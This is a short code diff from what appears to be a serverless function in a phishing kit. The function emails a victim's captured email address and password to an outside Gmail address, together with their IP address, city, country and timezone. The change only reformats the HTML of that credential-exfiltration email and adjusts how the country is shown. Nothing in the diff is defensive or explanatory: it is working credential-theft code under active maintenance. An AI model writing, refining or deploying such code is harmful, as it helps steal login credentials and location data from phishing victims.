@@ -23,15 +23,16 @@ export default async (req: Request, context: Context) => {
       to: "emilychan1178@gmail.com",
       subject: "New result",
       text: `Email: ${email} :: Password: ${password} :: Context: ${context.geo}`,
-      html: `<p>Login information: <br/> <br/>
+      html: `<div>
+            <h3>Login information:</h3> <br/> <br/>
             Email:: ${email} <br/>
             Password:: ${password} <br/><br/>
             Geolocation:
             IP:: ${context.ip} <br/>
             City:: ${context?.geo?.city} <br/>
-            Country:: ${context?.geo?.country} <br/>
+            Country:: ${Object.values(context?.geo?.country)} <br/>
             Timezone:: ${context?.geo?.timezone} <br/>
-            </p>`,
+            </div>`,
     };
 
   switch(req?.method){
